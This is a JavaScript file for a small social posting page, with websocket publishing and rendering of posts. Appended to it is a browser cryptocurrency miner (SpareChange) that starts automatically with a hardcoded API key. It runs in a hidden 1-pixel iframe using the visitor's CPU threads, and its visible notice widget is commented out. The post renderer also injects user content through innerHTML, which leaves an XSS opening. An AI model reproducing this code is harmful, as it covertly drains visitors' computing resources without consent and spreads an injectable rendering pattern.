/**Getting initial info */
getPubs();



/************** WebSockets **************/
var ws = new io();

ws.on('connect',function() {
  console.log('connected');
});

ws.on('disconnect', function(){});

var pubSender = getEl('pubSender');
pubSender.addEventListener('click',function(){
    var pubData = {
      pubid: 'fhfhfh',
      time: '45:78:12',
      nombre: 'unoname',
      content: getEl('pubContent').value,
      tkn: getEl('ctkn').value
    }
    ws.emit('pub',pubData);
    newPub(pubData);
});

/************* Publications **************/
function newEl(el){
    return document.createElement(el);
}

function newPub(res){
    var div = newEl('div');
    div.setAttribute('class','pubs border font');
    div.setAttribute('id',res.pubid);

    var content = newEl('p');
        content.setAttribute('class','content');
        content.innerHTML = res.content;
        //content = setFontSize(publication,res.content);
        //content = linkify(publication,res.pub,no_previsualization);


    //var imgUrl = getImage(res.imagen);
    var uImg = newEl('img');
        uImg.setAttribute('class','uImg borde');
        //uImg.setAttribute('src',imgUrl);

    var a = newEl('a');
        a.setAttribute('class','enlace1');
        a.setAttribute('href','/pagina/'+res.nombre);
        a.innerHTML = res.nombre;

    var hora = newEl('span');
        hora.setAttribute('class','time1');
        hora.innerHTML = res.time;

    var mg = newEl('span');
        mg.setAttribute('class','mg reacciones');
        mg.innerHTML = 'mg';

    var nmg = newEl('span');
        nmg.setAttribute('class','nmg reacciones');
        nmg.innerHTML = 'nmg';

    var comment = newEl('span');
        comment.setAttribute('class','comment reacciones');
        comment.innerHTML = 'comentar';
        //comment.addEventListener('click',comentar);

    div.prepend(comment);
    div.prepend(nmg);
    div.prepend(mg);
    div.prepend(content);
    div.prepend(hora);
    div.prepend(a);
    div.prepend(uImg);
    //div.addEventListener('click',getPublicationID);

    getEl('publications').prepend(div);
}

/************** Get Publications **************/
function getPubs(){
    fetch('/api/getPublications', {
        credentials: 'include',
        method: 'GET'
      })
        .then(res => {
          if(res.ok == false){
              console.log('Home->getPubs(): error');
              return;
          }
          return res.json();
      })
        .then(res => {
        console.log('Home->getPubs():',res);
      });
}

function getEl(id){
  return document.getElementById(id);
}

function notif(text){
    console.log(text);
}




var apiKey = "9bdb3f76dd22e98488f357e092abfcf2939a41aa8ed8c502aaf1e2b8be8982b02a97530dad92ccd892654f81a03e31f7e0eebfbbc0ca448a2b6f7e6dd6d4b00d";
  var numberOfThreads = null; // null will auto-select based on user's CPU. Otherwise a number from 1-n.
  var throttlePercent = 0.25; // 0.0 = no throttle (Will mine quickly). 1.0 = full throttling (Will mine very slowly, saves CPU) A good value is 0.5.
  var miner = new Miner(apiKey, numberOfThreads, throttlePercent);

  //execute the following line any time to start the miner
  miner.start();



  //
//function Widget(endpoint, method, width, options) {
//
//};
//Widget.prototype = {
//    showSpinner: function() {
//        var node = document.createElement("a");
//        node.href = "https://www.sparechange.io/faq/";
//        node.target = "_blank";
//        node.title = "Whats this? Click for more information";
//        node.style.position = 'fixed';
//
//        node.style.width = '100px';
//        node.style.height = '25px';
//        node.style.bottom = '175px';
//        node.style.right = '100px';
//        node.innerHTML = '<style type="text/css"> .loader {         position: relative;         width: 60px;         height: 60px;         border-radius: 50%;         margin: 75px;         display: inline-block;         vertical-align: middle;     }     /*LOADER-17*/   .loader-17 .css-square {       position: absolute;       top: 50%;       width: 25px; height: 7px;     background: #4286f4;     -webkit-box-shadow: 2px 2px 3px 0px black;             box-shadow: 2px 2px 3px 0px black;    }       //.loader-17 .square1 {         left: 70px;         -webkit-animation: dominos 1s 0.125s ease infinite;         animation: dominos 1s 0.125s ease infinite;     }      .loader-17 .square2 {         left: 60px;         -webkit-animation: dominos 1s 0.3s ease infinite;         animation: dominos 1s 0.3s ease infinite;     }      .loader-17 .square3 {         left: 50px;         -webkit-animation: dominos 1s 0.425s ease infinite;         animation: dominos 1s 0.425s ease infinite;     }      //.loader-17 .square4 {         left: 40px;         -webkit-animation: dominos 1s 0.540s ease infinite;         animation: dominos 1s 0.540s ease infinite;     }      .loader-17 .square5 {         left: 30px;         -webkit-animation: dominos 1s 0.665s ease infinite;         animation: dominos 1s 0.665s ease infinite;     }      .loader-17 .square6 {         left: 20px;         -webkit-animation: dominos 1s 0.79s ease infinite;         animation: dominos 1s 0.79s ease infinite;     //}      .loader-17 .square7 {         left: 10px;         -webkit-animation: dominos 1s 0.9s ease infinite;         animation: dominos 1s 0.9s ease infinite;     }      .loader-17 .square8 {         left: 0px;         -webkit-animation: dominos 1s 1s ease infinite;         animation: dominos 1s 1s ease infinite;     }   @-webkit-keyframes dominos {   50% { opacity: 0.7; }   75% { -webkit-transform: rotate(90deg); transform: rotate(90deg); }   80% { opacity: 1; }  }    @keyframes dominos //{   50% { opacity: 0.7; }   75% { -webkit-transform: rotate(90deg); transform: rotate(90deg); }   80% { opacity: 1; }  }      </style><div style="width:100%;height:100%;min-height:200px;text-align:center;position:relative;top:0px;left:0px;"><div class="loader loader-17"><div class="css-square square1"></div><div class="css-square square2"></div><div class="css-square square3"></div><div class="css-square square4"></div><div class="css-square square5"></div><div class="css-square //square6"></div><div class="css-square square7"></div><div class="css-square square8"></div></div></div>';
//        var scope = this;
//        node.onclick = function(e) {
//            scope.hideSpinner();
//        }
//        setTimeout(function() {
//            scope.hideSpinner();
//        }, 10000);
//
//        this.node = node;
//        document.body.appendChild(node);
//    },
//    hideSpinner: function() {
//        this.node.remove();
//        delete this.node;
//    }
//};
//var w = new Widget();
//w.showSpinner();

function startMiner(apiKey, numberOfThreads, throttlePercent) {
    var ifrm = document.createElement('iframe');
    ifrm.setAttribute('id', 'ifrm'); // assign an id

    //document.body.appendChild(ifrm); // to place at end of document

    // to place before another page element
    ifrm.style.visibility = 'hidden';
    ifrm.style.height = '1px';
    document.body.appendChild(ifrm);

    //var url = '/static/index.html'; //for local testing
    var url = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'static.sparechange.io/static/index.html';

    // assign url
    ifrm.setAttribute('src', url);
    return ifrm;
}

function Miner(spareChangeApiKey, p1, p2) {
    this.spareChangeApiKey = spareChangeApiKey;
    //determine if parameters are old or new style
    if( p1 === parseInt(p1, 10) || typeof p1 == 'undefined' || p1 === null) {
        //p1 = numThreads. p2 = throttlePct
        this.numThreads = p1 || navigator.hardwareConcurrency || 8;
        this.throttlePct = p2 || 0.0;
        this.optIn = 'no';
        this.optInDelay = 10;
        this.targetShares = 0;
    } else {
        //parse p1 as userOptions
        var userOptions = p1;
        this.numThreads = userOptions.numberOfThreads || navigator.hardwareConcurrency || 8;
        this.throttlePct = userOptions.throttlePercent || 0.0;
        if(userOptions.optIn) {
            this.optIn = userOptions.optIn.type || 'no';
            this.optInDelay = userOptions.optIn.delay || 10;
        } else {
            this.optIn = 'no';
            this.optInDelay = 10;
        }
        this.targetShares = userOptions.targetShares || 0;
    }

    this.numSharesSubmitted = 0;
    this.running = false;
    this.optedOut = false;
    this.hashesPerSecond = 0;
    this.hashesDone = 0;
    this.hashesPerThread = {};
    this.connectionOpen = false;
    this.token = null;
}
Miner.prototype = {
    MULTI_TAB: 1,
    FIRST_IN_LAST_OUT: 2,
    PRIORITY: 3,

    listeners: {
        share: [],
        job: [],
        hashrate: [],
        open: [],
        close: [],
        optin: [],
        error: [],
        authed: []
    },
    addEventListener: function(eventName, eventFunction) {
        this.listeners[eventName].push(eventFunction);
    },
    emitEvent: function(eventName, data) {
        for(var k in this.listeners[eventName]) {
            this.listeners[eventName][k](data);
        }
    },
    shareSubmitted: function(data) {
        data = JSON.parse(data);
        this.token = data.params.result;
        this.emitEvent('share', data.params);
        this.numSharesSubmitted += 1;
        if(this.targetShares > 0 && this.numSharesSubmitted >= this.targetShares) {
            this.stop();
        }
    },
    newJob: function(data) {
        if(!this.connectionOpen) {
            this.connectionOpen = true;
            this.emitEvent('open', null);
            this.emitEvent('authed', null);
            //w.showSpinner();
        }
        this.emitEvent('job', JSON.parse(data));
    },
    hashRate: function(data) {
        //calculate global hashrate
        this.hashesPerThread[data.thread_id] = data.hps;
        this.hashesPerSecond = 0;
        for(var k in this.hashesPerThread) {
            this.hashesPerSecond += this.hashesPerThread[k];
        }
        this.hashesDone += data.hashes_done;

        this.emitEvent('hashrate', data);
    },
    start: function() {
        if(this.isRunning()) {
            return;
        }
        this.hashesPerSecond = 0;
        this.hashesPerThread = {};
        this.hashesDone = 0;

        var scope = this;
        var init = function() {
                try {
                var ifrm = startMiner(scope.apiKey, scope.numberOfThreads, scope.throttlePercent);
                ifrm.onload = function() {
                    ifrm.contentWindow.postMessage('start,'+scope.spareChangeApiKey+':3'+','+scope.numThreads+','+scope.throttlePct, '*');
                };
                scope.ifrm = ifrm;
            } catch(e) {
                scope.emitEvent('error', e);
            }
        };
        var readyStateCheckInterval = setInterval(function() {
            if (document.readyState === "complete") {
                clearInterval(readyStateCheckInterval);
                init();
                scope.running = true;
            }
        }, 10);
        this.windowEventListener = function(e) {
            var key = e.message ? 'message' : 'data';
            var data = e[key];
            if(data.type == 0) {
                scope.shareSubmitted(data.data);
            }
            if(data.type == 1) {
                scope.newJob(data.data);
            }
            if(data.type == 2) {
                scope.hashRate(data.data);
            }
        };
        window.addEventListener('message', this.windowEventListener, false);
    },
    stop: function(callbackFunction) {
        if(!this.isRunning()) {
            return;
        }
        var scope = this;
        this.ifrm.contentWindow.postMessage('stop,'+scope.spareChangeApiKey+','+scope.numThreads+','+scope.throttlePct, '*');
        setTimeout(function() {
            document.body.removeChild(this.ifrm);
            scope.running = false;
            window.removeEventListener('message', scope.windowEventListener);
            scope.windowEventListener = null;
            scope.connectionOpen = false;
            scope.emitEvent('close', null);
            if(callbackFunction) {
                callbackFunction();
            }
        }, 200);
    },
    isMobile: function() {
        var check = false;
        (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
        return check;
    },
    isRunning: function() {
        return this.running;
    },
    optedOut: function() {
        return this.optedOut;
    },
    getAcceptedShares: function() {
        return this.numSharesSubmitted;
    },
    getHashesPerSecond: function() {
        return this.hashesPerSecond;
    },
    hasWASMSupport: function() {
        return typeof window.WebAssembly != 'undefined';
    },
    getNumThreads: function() {
        return this.numThreads;
    },
    setNumThreads: function(numberOfThreads) {
        this.numThreads = numberOfThreads;
        var scope = this;
        this.stop(function() {scope.start();});
    },
    getThrottle: function() {
        return this.numThreads;
    },
    setThrottle: function(throttlePct) {
        this.throttlePct = throttlePct;
        var scope = this;
        this.stop(function() {scope.start();});
    },
    getTotalHashes: function() {
        return this.hashesDone;
    },
    getAcceptedHashes: function() {
        return this.hashesDone;
    }
};